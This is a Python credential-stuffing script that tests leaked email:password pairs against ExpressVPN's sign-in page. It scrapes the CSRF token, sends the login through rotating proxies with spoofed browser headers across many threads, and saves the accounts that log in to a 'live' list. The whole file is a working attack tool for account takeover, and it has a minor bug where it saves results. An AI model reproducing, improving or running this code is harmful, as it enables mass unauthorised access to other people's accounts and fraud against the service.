import requests, utils, concurrent.futures
from bs4 import BeautifulSoup

emaillist = "./accounts"
livelist = "./expressvpn"

def check():
    try:
        account = utils.save.removeFirstLine(emaillist).strip()
        if account:
            [email, senha] =  account.split(':')
            session = utils.session(proxy=True)
            h1 = {
                'authority': 'www.expressvpn.net',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-gpc': '1',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://www.expressvpn.net/sign-in',
                'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            r = session.get('https://www.expressvpn.net/sign-in', headers = h1)
            soup = BeautifulSoup(r.content, 'lxml')
            token = soup.find('input', {'name': 'authenticity_token'})['value']
            headers = {
                'authority': 'www.expressvpn.net',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://www.expressvpn.net',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-gpc': '1',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://www.expressvpn.net/sign-in',
                'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            data = data = {
                'utf8': '\u2713',
                'authenticity_token': token,
                'location_fragment': '',
                'redirect_path': '',
                'email': email,
                'password': senha,
                'commit': 'Sign In'
            }
            resp = session.post("https://www.expressvpn.net/sessions", headers = headers, data=data)
            if '">Verification code' in resp.text:
                utils.colors.correct("Login válido")
                utils.save.savetofile(livelist, resp.text()["email"])
            elif 'Invalid email or password.' in resp.text:
                utils.colors.error("Login inválido")
            elif 'HTTPSConnectionPool' in resp.text:
                utils.colors.info("Proxy Error")
                utils.save.savetofile(emaillist, account)
    except Exception as e:
        utils.colors.info(e)
        utils.save.savetofile(emaillist, account)

if __name__ == "__main__":
    try:
        lista_len = utils.get_len(emaillist)
        utils.colors.correct(f"Loaded {lista_len}x items.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(input("Threads: "))) as executor:
            [executor.submit(check) for i in range(0, lista_len, 1)]
    except KeyboardInterrupt:
        pass

input('Acabou.')